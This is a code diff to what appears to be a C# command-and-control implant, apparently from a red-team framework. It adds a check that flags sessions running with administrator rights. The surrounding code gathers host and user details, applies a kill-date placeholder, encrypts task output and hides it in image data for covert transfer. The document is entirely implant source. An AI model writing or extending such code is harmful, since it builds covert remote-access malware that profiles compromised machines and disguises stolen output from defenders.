@@ -108,6 +108,13 @@ public class Program
 		}
 	}
 
+	static bool IsHighIntegrity()
+	{
+		System.Security.Principal.WindowsIdentity identity = System.Security.Principal.WindowsIdentity.GetCurrent();
+		System.Security.Principal.WindowsPrincipal principal = new System.Security.Principal.WindowsPrincipal(identity);
+		return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
+	}
+	
 	static string Encryption(string key, string un, bool comp = false, byte[] unByte = null)
 	{
 		byte[] byEnc = null;
@@ -170,6 +177,8 @@ public class Program
 		if (Convert.ToDateTime("#REPLACEKILLDATE#") > DateTime.Now)
 		{
 			var u = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
+			if (IsHighIntegrity())
+			  u += "*";
 			var dn = System.Environment.UserDomainName;
 			var cn = System.Environment.GetEnvironmentVariable("COMPUTERNAME");
 			var arch = System.Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
@@ -501,7 +510,7 @@ public class Program
 			}
 			catch (Exception e)
 			{
-				var task = Encryption(Key, "Error"); 
+				var task = Encryption(Key, "Error");
 				var eroutput = Encryption(Key, $"Error: {output.ToString()} {e}", true);
 				var outputBytes = System.Convert.FromBase64String(eroutput);
 				var sendBytes = ImgGen.GetImgData(outputBytes);
